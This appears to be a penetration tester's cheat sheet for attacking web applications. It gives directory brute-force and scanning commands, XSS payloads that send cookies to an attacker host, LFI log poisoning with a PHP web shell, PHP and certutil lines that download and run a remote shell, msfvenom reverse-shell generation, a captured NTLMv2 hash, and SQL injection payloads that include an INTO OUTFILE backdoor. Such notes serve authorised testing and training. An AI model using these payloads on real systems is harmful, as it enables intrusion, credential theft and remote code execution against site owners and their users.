

* ### Web Applications

> #### spider
```
wget --spider -r http://$IP:$PORT 2>&1 | grep '^--' | awk '{ print $3 }' | grep -v '\.\(css\|js\|png\|gif\|jpg\)$' > urls.wget
```

```
sudo nmap --script=http-title
sudo nmap --script=http-headers
sudo nmap --script=http-enum
```
>  #### Browsing
```
robots.txt
# when robots.txt is accessable only by bot scans
curl -A "'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')" http://website/robots.txt
# wappalyzer
# javascript
# view source
# firefox / chrome Dev Tools
# whatweb
```
> #### Scanning
```
gobuster dir --url http://$IP:$PORT../.. -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.aspx -o gobuster.out
dirb http://$IP:$PORT/ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o dirb.txt
dirbuster
wpscan
nikto -C all -host http://$IP:$PORT -o nikto.out
wfuzz -v -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  --hc 404 -u http://$IP:$PORT/FUZZ -R2
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 1000 -u http:/$IP:$PORT/FUZZ -recursion --recursion-depth 3 -c -v -o ffuf.out

dirsearch -u http://$IP:$PORT -r -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o /home/kali/pentest/IP/dirsearch.txt

dirsearch -u http://192.168.126.66 -r -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o $(pwd)/dirsearch.txt --exclude-sizes=150B,152B

dirsearch -e php,html,js -u http://$IP:$PORT -r

```

#### curl it
```bash
curl -d "" -X POST http://IP/helloworld
```

#### XSS test
```js
hello *;<>
<script>alert(‘XSS’)</script>
<iframe src=http://$Attacker_IP/report height=”0” width=”0”></iframe>
<script>new Image().src="http://$Attacker_IP/cool.jpg?output="+document.cookie;</script>
    # sudo nc -vlnp 80
```

#### LFI - poison log file
```bash
nc -nv $Target 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
# http://$Target/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
# [03/Feb/2022:05:03:30 -0800] "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>\n" 400 980 "-" "-"
# [03/Feb/2022:05:03:46 -0800] "GET /menu.php?file=c:\\xampp\\apache\\logs\\access.log&cmd=ipconfig HTTP/1.1" 200 14552 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"

```

> burp

```
# php wrapper
<?php  $output = shell_exec(' ....'); echo "<pre>$output</pre>";  ?>
GET /thefile.php?variable=php://input

<?php system("wget <http://$IP:$PORT../my_shell.txt -O /tmp/my_shell.php;php /tmp/my_shell.php");?>
GET /THE/PATH/TO/VULN.php?vuln=../../../../../../../../../path/to/your/new/database/something.php

```

#### - LFI [ read page index.php?page=C:\xampp\apache\conf\httpd.conf ]
```bash
# Create payload
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4444 -f exe > shell.exe
```
> Create execution on Windows for LFI download file
```php
# 1.php
<?php $exec = system('certutil.exe -urlcache -split -f "http://$ip/shell.exe" shell.exe', $val); ?> 

# 2.php
<?php $exec = system('shell.exe', $val); ?>
```


#### Server-Side Request Forgery (SSRF)
```bash
sudo responder -I
[HTTP] NTLMv2 Client   : ::ffff:192.168.128.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:7930e180ef64cc82:1B6C8A86ED801ADB56FAD8243D48AE7A:0101000000000000FEE45CD7292FD8016F2BC579D8B17B140000000002000800410054003000430001001E00570049004E002D003600390038005500440053004C0050004F0036004C000400140041005400300043002E004C004F00430041004C0003003400570049004E002D003600390038005500440053004C0050004F0036004C002E0041005400300043002E004C004F00430041004C000500140041005400300043002E004C004F00430041004C000800300030000000000000000000000000300000EA07050D7D15A06A761ED67D7E9A22EAB46EB3F3FB7F2D573C4991DDA995A20D0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340039002E003100320038000000000000000000


```

> #### SQL injection
[deeper detail](sql_injection.md)

```
/debug.php?id=1 union all select 1, 2, @@version
/debug.php?id=1 union all select 1, 2, 3
/debug.php?id=1 union all select 1, 2, table_name frominformation_schema.tables
/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
/debug.php?id=1 union all select 1, username, password from users

### create file OUT file
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echoshell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'


/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1 ' | | ' asd ' | | '
/?q=1'  or  '1'='1
/?q=1  or  1=1
/?q= 'or' '='
' or '1' ='1' --
' or '1'='1

searchterm OR 1=1-
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
OR 3=3;#
OR 2=2 LIMIT 1;
OR 'a'='a
OR 1=1 --+
https://TARGET.COM/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1
https://TARGET.COM/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--
http://TARGET.COM/index.php?id=2%20union%20all%20select%201,%202,%20@@version

curl -i -s -k -X $'POST' \\n    -H $'Host: $$IP:$PORT:PORT' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 26' -H $'Origin: http://10.11.1.128:4167' -H $'Connection: close' -H $'Referer: http://$$IP:$PORT:PORT/search.asp' -H $'Upgrade-Insecure-Requests: 1' \\n    -b $'SESSIONCOOKIE=COOOOOKIE' \\n    --data-binary $'\x0d\x0aartist=id=1 \'or\' 1 \'=\' 1' \\n    $'http://$$IP:$PORT:PORT/search.asp'

curl -i -s -k -X $'POST' -H $'Host: $$IP:$PORT:PORT' -H $'Origin: http://$$IP:$PORT:PORT' -H $'Connection: close' -H $'Referer: http://$$IP:$PORT:PORT/search.asp' -H $'Upgrade-Insecure-Requests: 1' -b $'ASPSESSIONIDQSQTTSQD=HAGFDELAABCPGKKBCNMKIFHI' --data-binary $'song=id=1 \'or\' 1 \'=\' 1' $'http://$$IP:$PORT:PORT/search.asp'
```
